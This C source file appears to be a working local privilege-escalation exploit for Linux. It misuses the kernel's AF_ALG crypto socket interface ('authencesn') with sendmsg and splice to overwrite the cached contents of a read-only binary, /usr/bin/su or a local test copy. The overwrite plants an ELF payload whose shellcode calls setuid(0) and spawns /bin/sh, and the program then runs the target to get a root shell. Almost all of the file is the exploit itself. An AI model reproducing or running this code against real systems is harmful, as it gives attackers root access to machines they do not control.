#define _GNU_SOURCE

#include <stdio.h>
#include <sys/socket.h>
#include <linux/if_alg.h>
#include <unistd.h>
#include <linux/uio.h>
#include <string.h>
#include <fcntl.h>
#include <stdlib.h>
#include <time.h>

#define DEBUG 1 // enable or disable debugging
#define LOCAL_PRODUCER 1 // for developer purpose

/*
*   If you enable this flag, the exploit will fail and request a password.
*   WARNING:
*       - At that moment (password request), don't press Ctrl+C; it will break your terminal.
*       - Enter random letters and press Enter. So it will return an authentication error and will not break your terminal.😇
*   - Or we  need implement signal handler(SIGINT)
*/
#define FULL_RANDOMIZE 0

// check debug mode enabled
#define DEBUG_CHK(X) ((X) ? 1 : 0)

#ifndef FLUSH_MSG
    #define FLUSH_MSG() fflush(stdout)
#endif

// bitmask flags for syscall order
#define NONE            0
#define RT_SOCKET       (1 << 0) // 00000001 (ex: reach to socket)
#define RT_BIND         (1 << 1) // 00000010
#define RT_SETSOCKOPT   (1 << 2) // 00000100
#define RT_ACCEPT       (1 << 3) // 00001000
#define RT_SENDMSG      (1 << 4) // 00010000
#define RT_SPLICE_P     (1 << 5) // 00100000   file -> pipe
#define RT_SPLICE_D     (1 << 6) // 01000000    pipe -> destination
#define RT_RECV         (1 << 7) // 10000000

#define DEBUG_MSG(X) do{                                \
    if(DEBUG_CHK(DEBUG)){                               \
        switch (X) {                                    \
            case(RT_SOCKET):                            \
                printf("Reach to socket syscall\n");    \
                FLUSH_MSG();                            \
                break;                                  \
            case(RT_BIND):                              \
                printf("Reach to bind syscall\n");      \
                FLUSH_MSG();                            \
                break;                                  \
            case(RT_SETSOCKOPT):                        \
                printf("Reach to setsockopt syscall\n");\
                FLUSH_MSG();                            \
                break;                                  \
            case(RT_ACCEPT):                            \
                printf("Reach to accept syscall\n");    \
                FLUSH_MSG();                            \
                break;                                  \
            case(RT_SENDMSG):                           \
                printf("Reach to sendmsg syscall\n");   \
                FLUSH_MSG();                            \
                break;                                  \
            case(RT_SPLICE_P):                          \
                printf("Data sent from file 2 pipe\n"); \
                FLUSH_MSG();                            \
                break;                                  \
            case(RT_SPLICE_D):                          \
                printf("Data sent from pipe 2 dest\n"); \
                FLUSH_MSG();                            \
                break;                                  \
            case(RT_RECV):                              \
                printf("Reach to recv syscall\n");      \
                FLUSH_MSG();                            \
                break;                                  \
            default: break;                             \
        }                                               \
    }                                                   \
}while(0)

#ifndef CHUNK_SIZE_T1
    #define CHUNK_SIZE_T1 4
#endif

// buffer for save msg
char recv_buffer[64];

// for fd
typedef struct {
    int sockfd;
    int session_fd;
    int pipe_fds[2];
}fds;

/*
*   Purpose = fd initialization
*
*   @fds = pointer to a type-defined structure called fds.
*   return type = None return type(void)
*/ 
static inline void fd_init (fds *fds){
    if(!fds) return;

    fds->sockfd = -1;
    fds->session_fd = -1;
    fds->pipe_fds[0] = -1; 
    fds->pipe_fds[1] = -1;
}

/*
*   Purpose = cleanup the fds.
*
*   @fds = pointer to a type-defined structure called fds.
*   return type = None return type(void)
*/
static void fd_cleanup(fds *fds){
    if(!fds) return;

    if(fds->sockfd >= 0){
        close(fds->sockfd);
        fds->sockfd = -1;
    }

    if(fds->session_fd >= 0){
        close(fds->session_fd);
        fds->session_fd = -1;
    }

    if(fds->pipe_fds[0] >= 0){
        close(fds->pipe_fds[0]);
        fds->pipe_fds[0] = -1;
    }

    if(fds->pipe_fds[1] >= 0){
        close(fds->pipe_fds[1]);
        fds->pipe_fds[1] = -1;
    }
}

/*
*   Purpose - Pass the data to kernel.
*
*   @file_fd = target file fd
*   @counter = loop counter(that increment by 4)
*   @payload = pointer to payload 4 bytes.
*
*   return type = ssize_t(signed, can be return negative values)
*/
static ssize_t algo(int file_fd, int counter, unsigned char *payload){

    // input validation
    if(fcntl(file_fd, F_GETFD) == -1 || counter < 0 || !payload){
        return -1;
    }

    int err = 0, i = 0, size = 0, max = 100, min = 25; // min = rtattr+enckeylen(8 byte) + AES key(16 byte) = 24 bytes + 1 byte at least for HMAC key = total 25 bytes
    ssize_t retd = 0, splice_bytes = 0;
    fds fds;
    fd_init(&fds);

    // setup the sockaddr_alg to pass the socket
    const struct sockaddr_alg sa = {
        .salg_family = AF_ALG,
        .salg_type = "aead",
        .salg_name = "authencesn(hmac(sha256),cbc(aes))"
    };

    srand((unsigned int)time(NULL));
    size = (rand() % (max - min + 1))+ min;
    unsigned char buf[size];

    for(int _x = 0; _x < size; _x++){

        unsigned char random_byte = rand() % 256;
        buf[_x] = random_byte;
    }

    #if !FULL_RANDOMIZE
    // overwrite first 8 byte is must{but need to find why we cant change that}
    for(int __x = 0; __x < 8; __x++){
        switch(__x){    // can be optimized this but used manual method for debugging.
            case(0):
                buf[__x] = 0x08;
                break;
            case(1):
                buf[__x] = 0x00;
                break;
            case(2):
                buf[__x] = 0x01;
                break;
            case(3):
            case(4):
            case(5):
            case(6):
                buf[__x] = 0x00;
                break;
            case(7):
                buf[__x] = 0x10;
                break;
            default: break;
        }
    }
    #endif

    // first control header data
    const char ctrl_buf_1[4] = {
        0x00, 0x00, 0x00, 0x00
    };

    // second control header data
    const char ctrl_buf_2[20] = {
        0x10, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00
    };

    // third control header data
    const char ctrl_buf_3[4] = {
        0x08, 0x00, 0x00, 0x00
    };

    /*
    *   - initialize the message header
    *   - defined in `include/linux/socket.h`
    *       - but user side defined as user_msghdr(IMPORTANT)
    */
    struct msghdr msg = {0};

    /*
    *   - setup the data for pass control headers
    *
    *   - Layout
    *
    *     ____________________________________
    *    | A | A | A | A | 00 | 00 | 00 | 00 |
    *    |____________________|______________|
    *   ________________________________________
    *   |      4 A's    | 4 bytes from payload |
    *   |_______________|______________________|
    */
    unsigned char data[8];
    memset(data, 'A', CHUNK_SIZE_T1);
    memcpy(data + CHUNK_SIZE_T1, payload, CHUNK_SIZE_T1);

    // setup vecterized input output
    struct iovec iov[1];
        
    iov[0].iov_base = data;
    iov[0].iov_len = sizeof(data);

    // setup the control buffer
    char control_bufffer[CMSG_SPACE(sizeof(ctrl_buf_1)) + CMSG_SPACE(sizeof(ctrl_buf_2)) + CMSG_SPACE(sizeof(ctrl_buf_3))];
    memset(control_bufffer, 0, sizeof(control_bufffer));

    // assign the data to message header
    msg.msg_iov = iov;
    msg.msg_iovlen = 1;
    msg.msg_control = control_bufffer;
    msg.msg_controllen = sizeof(control_bufffer);

    // first control header
    struct cmsghdr *cmsg = CMSG_FIRSTHDR(&msg);
    cmsg->cmsg_level = SOL_ALG; // protocol
    cmsg->cmsg_type = 3; // protocol specific 
    cmsg->cmsg_len = CMSG_LEN(sizeof(ctrl_buf_1));    // control header length
    memcpy(CMSG_DATA(cmsg), ctrl_buf_1, sizeof(ctrl_buf_1)); // control header data

    // second control header
    cmsg = CMSG_NXTHDR(&msg, cmsg);
    cmsg->cmsg_level = SOL_ALG;
    cmsg->cmsg_type = 2;
    cmsg->cmsg_len = CMSG_LEN(sizeof(ctrl_buf_2));
    memcpy(CMSG_DATA(cmsg), ctrl_buf_2, sizeof(ctrl_buf_2));

    // third control header
    cmsg = CMSG_NXTHDR(&msg, cmsg);
    cmsg->cmsg_level = SOL_ALG;
    cmsg->cmsg_type = 4;
    cmsg->cmsg_len = CMSG_LEN(sizeof(ctrl_buf_3));
    memcpy(CMSG_DATA(cmsg), ctrl_buf_3, sizeof(ctrl_buf_3));

    // pass the data to socket syscall
    DEBUG_MSG(RT_SOCKET);
    fds.sockfd = socket(AF_ALG, SOCK_SEQPACKET|SOCK_CLOEXEC, 0); // Even Python adds this secretly. So you can see this SOCK_CLOEXEC at runtime.
    if(fds.sockfd < 0){
        #if DEBUG
            perror("Sockfd(AF_ALG):");
        #endif
        goto exit;
    }

    // pass the data to bind syscall
    DEBUG_MSG(RT_BIND);
    err = bind(fds.sockfd, (struct sockaddr *)&sa, sizeof(sa));
    if(err < 0){
        #if DEBUG
            perror("Bind(sockaddr_alg):");
        #endif
        fd_cleanup(&fds);
        goto exit;
    }

    // pass data to setsockopt syscall(SET KEY)
    DEBUG_MSG(RT_SETSOCKOPT);
    err = setsockopt(fds.sockfd, SOL_ALG, ALG_SET_KEY, buf, sizeof(buf));
    if(err < 0){
        #if DEBUG
            perror("Setsockopt(ALG_SET_KEY):");
        #endif
        fd_cleanup(&fds);
        goto exit;
        
    }
    // pass data to setsockopt syscall(ALG_SET_AEAD_AUTHSIZE)
    err = setsockopt(fds.sockfd, SOL_ALG, ALG_SET_AEAD_AUTHSIZE, NULL, 4);
    if(err < 0){
        #if DEBUG
            perror("Setsockopt(ALG_SET_AEAD_AUTHSIZE):");
        #endif
        fd_cleanup(&fds);
        goto exit;
    }

    // pass data to accept syscall
    DEBUG_MSG(RT_ACCEPT);
    fds.session_fd = accept(fds.sockfd, NULL, 0);
    if(fds.session_fd < 0){
        #if DEBUG
            perror("Accept:");
        #endif
        fd_cleanup(&fds);
        goto exit;
    }

    // pass data to the sendmsg syscall
    DEBUG_MSG(RT_SENDMSG);
    retd = sendmsg(fds.session_fd, &msg, MSG_MORE);
    if(retd < 0){
        #if DEBUG
            perror("Sendmsg");
        #endif
        fd_cleanup(&fds);
        goto exit;
    }

    // use pipe syscall
    err = pipe(fds.pipe_fds);
    if(err < 0){
        #if DEBUG
            perror("Pipe:");
        #endif
        fd_cleanup(&fds);
        goto exit;
    }

    // assign file descripters
    int read_fd = fds.pipe_fds[0];
    int write_fd = fds.pipe_fds[1];

    // pass data from file to pipe
    splice_bytes = splice(file_fd, NULL, write_fd, NULL, CHUNK_SIZE_T1, 0);
    if(splice_bytes < 0){
        #if DEBUG
            perror("Splice(FILE2PIPE):");
        #endif
        fd_cleanup(&fds);
        goto exit;
    }
    DEBUG_MSG(RT_SPLICE_P);

    // pass data from pipe to dest
    splice_bytes = splice(read_fd, NULL, fds.session_fd, NULL, splice_bytes, 0);
    if(splice_bytes < 0){
        #if DEBUG
            perror("Splice(PIPE2DEST):");
        #endif
        fd_cleanup(&fds);
        goto exit;
    }
    DEBUG_MSG(RT_SPLICE_D);

    // pass data to the recv syscall
    DEBUG_MSG(RT_RECV);
    retd = recv(fds.session_fd, recv_buffer, sizeof(recv_buffer), 0);
    if(retd < 0){
        #if DEBUG
            perror("Recv:");    // NOTE: This syscall failed all the time in this script
        #endif
        fd_cleanup(&fds);
        goto exit;
    }

    fd_cleanup(&fds);
    
    return retd;   // return length of recieved data

exit:
    return (ssize_t)-1;
}

int main(){
    ssize_t ret = 0;
    int file_fd = -1, i = 0;

    // ELF payload
    unsigned char payload[160] = {
        0x7f, 0x45, 0x4c, 0x46, 0x02, 0x01, 0x01, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x02, 0x00, 0x3e, 0x00, 0x01, 0x00, 0x00, 0x00,
        0x78, 0x00, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x40, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x38, 0x00,
        0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x01, 0x00, 0x00, 0x00, 0x05, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x9e, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x9e, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x10, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x31, 0xc0, 0x31, 0xff, 0xb0, 0x69, 0x0f, 0x05,
        0x48, 0x8d, 0x3d, 0x0f, 0x00, 0x00, 0x00, 0x31,
        0xf6, 0x6a, 0x3b, 0x58, 0x99, 0x0f, 0x05, 0x31,
        0xff, 0x6a, 0x3c, 0x58, 0x0f, 0x05, 0x2f, 0x62,
        0x69, 0x6e, 0x2f, 0x73, 0x68, 0x00, 0x00, 0x00
    };

    // target file
    #if LOCAL_PRODUCER
        file_fd = open("/home/ravindu/research/copy-fail/su.test", O_RDONLY);
    #else
        file_fd = open("/usr/bin/su", O_RDONLY);
    #endif
    if(file_fd < 0){
        close(file_fd);
        file_fd = -1;
        return -1;
    }

    // loop for pass the data
    for(; i < sizeof(payload); i += CHUNK_SIZE_T1){
        ret = algo(file_fd, i, &payload[i]);

        // ignore failure if not debug mode enable
        #if DEBUG
        if(ret < 0){
            printf("Counter %d failed\n", i);
        }

        // line break for better visibility
        printf("\n");
        #endif

    }

    // close the target file fd
    close(file_fd);

    printf("[1.] Execute the target file...\n");

    // call the target file after overwrite.
    #if LOCAL_PRODUCER
        system("/home/ravindu/research/copy-fail/su.test");
    #else
        system("su");
    #endif

    return 0;
}

/* 
*   References
*       - https://docs.kernel.org/7.1/crypto/userspace-if.html
*       - https://man7.org/linux/man-pages/man3/cmsg.3.html
*
*/